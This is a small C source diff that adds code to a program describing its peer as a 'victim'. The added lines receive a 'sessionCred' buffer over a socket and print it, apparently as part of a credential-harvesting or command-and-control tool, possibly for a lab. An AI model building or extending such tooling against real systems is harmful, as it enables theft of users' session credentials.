@@ -89,6 +89,7 @@ int main()
 
     unsigned char  encrypted[4098]={};
     unsigned char decrypted[4098]={};
+    char sessionCred[2048];
     int sockid;
     int server_port = 8888;
     char *server_ip = "10.0.0.2";
@@ -129,6 +130,9 @@ int main()
 
     printf("Connected to a victim\n");
 
+    recv(sockid, sessionCred,2048,0);
+
+    printf("%s\n", sessionCred);
     
 
     //n = recv(client_socket, (char *)buffer, 2048, MSG_WAITALL );
